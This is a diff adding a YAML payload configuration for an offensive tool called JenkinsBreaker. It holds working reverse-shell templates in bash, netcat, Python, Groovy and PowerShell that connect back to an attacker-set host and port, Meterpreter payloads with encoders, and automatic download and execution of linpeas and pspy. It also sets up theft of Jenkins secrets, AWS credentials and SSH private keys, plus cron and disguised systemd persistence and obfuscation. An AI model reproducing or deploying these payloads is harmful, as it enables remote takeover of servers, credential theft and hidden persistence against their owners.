@@ -1,0 +1,215 @@
+# JenkinsBreaker Payload Configuration
+# Customize reverse shells and post-exploitation payloads
+
+# Reverse shell configuration
+reverse_shells:
+  # Bash reverse shells
+  bash:
+    enabled: true
+    templates:
+      - name: "nc_traditional"
+        payload: "nc -e /bin/bash {lhost} {lport}"
+        description: "Traditional netcat with -e"
+      
+      - name: "bash_tcp"
+        payload: "bash -i >& /dev/tcp/{lhost}/{lport} 0>&1"
+        description: "Bash TCP redirect"
+      
+      - name: "nc_mkfifo"
+        payload: "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc {lhost} {lport} >/tmp/f"
+        description: "Netcat with FIFO"
+    
+    default: "bash_tcp"
+    encode: true
+    encoding: "base64"
+  
+  # Python reverse shells
+  python:
+    enabled: true
+    templates:
+      - name: "socket_subprocess"
+        payload: |
+          import socket,subprocess,os;
+          s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
+          s.connect(("{lhost}",{lport}));
+          os.dup2(s.fileno(),0);
+          os.dup2(s.fileno(),1);
+          os.dup2(s.fileno(),2);
+          subprocess.call(["/bin/bash","-i"]);
+        description: "Python socket + subprocess"
+      
+      - name: "pty_spawn"
+        payload: |
+          import socket,subprocess,os,pty;
+          s=socket.socket();
+          s.connect(("{lhost}",{lport}));
+          [os.dup2(s.fileno(),fd) for fd in (0,1,2)];
+          pty.spawn("/bin/bash");
+        description: "Python with PTY for full shell"
+    
+    default: "socket_subprocess"
+    minify: true
+  
+  # Groovy reverse shells (Jenkins-specific)
+  groovy:
+    enabled: true
+    templates:
+      - name: "process_builder"
+        payload: |
+          String host="{lhost}";
+          int port={lport};
+          String cmd="/bin/bash";
+          Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();
+          Socket s=new Socket(host,port);
+          InputStream pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();
+          OutputStream po=p.getOutputStream(),so=s.getOutputStream();
+          while(!s.isClosed()){{while(pi.available()>0)so.write(pi.read());
+          while(pe.available()>0)so.write(pe.read());
+          while(si.available()>0)po.write(si.read());
+          so.flush();po.flush();Thread.sleep(50);
+          try {{p.exitValue();break;}}catch (Exception e){{}}}};
+          p.destroy();s.close();
+        description: "Groovy ProcessBuilder reverse shell"
+    
+    default: "process_builder"
+  
+  # PowerShell reverse shells
+  powershell:
+    enabled: true
+    templates:
+      - name: "tcp_client"
+        payload: |
+          $client = New-Object System.Net.Sockets.TCPClient('{lhost}',{lport});
+          $stream = $client.GetStream();
+          [byte[]]$bytes = 0..65535|%{{0}};
+          while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{
+            $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
+            $sendback = (iex $data 2>&1 | Out-String );
+            $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';
+            $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
+            $stream.Write($sendbyte,0,$sendbyte.Length);
+            $stream.Flush()
+          }};
+          $client.Close()
+        description: "PowerShell TCP client"
+      
+      - name: "base64_encoded"
+        payload: "powershell -e {base64_payload}"
+        description: "Base64-encoded PowerShell"
+    
+    default: "tcp_client"
+    obfuscate: true
+
+# Meterpreter configuration
+meterpreter:
+  enabled: true
+  check_msfvenom: true
+  fallback_on_missing: true
+  
+  payloads:
+    - name: "linux/x64/meterpreter/reverse_tcp"
+      platform: "linux"
+      arch: "x64"
+      encoder: "x64/xor"
+      iterations: 3
+    
+    - name: "windows/x64/meterpreter/reverse_tcp"
+      platform: "windows"
+      arch: "x64"
+      encoder: "x64/xor"
+      iterations: 3
+  
+  handler_config:
+    auto_generate: true
+    output_path: "./payloads/meterpreter_handler.rc"
+
+# Post-exploitation tools
+post_exploitation:
+  # Reconnaissance tools
+  recon:
+    linpeas:
+      enabled: true
+      url: "https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh"
+      local_path: "./payloads/linpeas.sh"
+      upload_path: "/tmp/linpeas.sh"
+      auto_execute: true
+    
+    pspy:
+      enabled: true
+      url: "https://github.com/DominicBreuker/pspy/releases/latest/download/pspy64"
+      local_path: "./payloads/pspy64"
+      upload_path: "/tmp/pspy64"
+      auto_execute: true
+  
+  # Credential extraction
+  credentials:
+    jenkins_decrypt:
+      enabled: true
+      tool: "offsec-jenkins"
+      auto_extract:
+        - master.key
+        - hudson.util.Secret
+        - credentials.xml
+    
+    aws_credentials:
+      enabled: true
+      paths:
+        - "~/.aws/credentials"
+        - "~/.aws/config"
+    
+    ssh_keys:
+      enabled: true
+      paths:
+        - "~/.ssh/id_rsa"
+        - "~/.ssh/id_ecdsa"
+        - "~/.ssh/id_ed25519"
+  
+  # Persistence
+  persistence:
+    cron:
+      enabled: false
+      payload_type: "reverse_shell"
+      schedule: "*/15 * * * *"  # Every 15 minutes
+    
+    systemd:
+      enabled: false
+      service_name: "jenkins-updater"
+      payload_type: "reverse_shell"
+
+# Payload encoding/obfuscation
+encoding:
+  base64:
+    enabled: true
+    platforms:
+      - linux
+      - windows
+  
+  hex:
+    enabled: true
+    platforms:
+      - linux
+  
+  url_encoding:
+    enabled: true
+    platforms:
+      - all
+  
+  custom:
+    enabled: false
+    script: "./scripts/custom_encoder.py"
+
+# Listener configuration (for reference)
+listeners:
+  netcat:
+    command: "nc -lvnp {lport}"
+    platforms:
+      - linux
+  
+  ncat:
+    command: "ncat -lvnp {lport} --ssl"
+    platforms:
+      - linux
+  
+  metasploit:
+    command: "msfconsole -r {handler_rc}"
+    auto_generate_rc: true
